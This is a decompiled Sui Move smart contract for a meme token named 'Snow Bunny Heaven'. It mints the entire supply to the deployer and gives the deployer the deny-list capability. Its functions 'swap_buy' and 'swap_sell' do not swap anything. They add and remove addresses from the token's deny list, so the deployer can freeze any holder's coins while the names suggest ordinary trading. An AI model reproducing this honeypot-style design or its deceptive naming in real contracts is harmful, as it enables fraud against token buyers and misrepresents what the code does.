module 0xb1460bb365b3cf46e68592b5adda8aff0763eda877bef4aef88efbcb19b37eb2::sbh {
    struct SBH has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SBH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SBH>(arg0, 9, b"SBH", b"Snow Bunny Heaven", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmeco2tyiQSych5jdYT2BN8sqy6wSeBB1bjoMeRVEz9NJ8"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SBH>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SBH>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SBH>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SBH>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SBH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SBH>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SBH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SBH>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

